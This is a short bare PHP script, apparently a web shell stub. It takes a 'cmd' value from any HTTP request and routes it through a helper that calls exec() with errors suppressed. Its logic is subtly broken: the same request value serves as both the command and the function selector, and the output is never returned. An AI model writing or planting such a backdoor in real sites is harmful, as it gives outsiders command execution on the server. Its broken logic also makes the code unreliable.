<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
	}
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>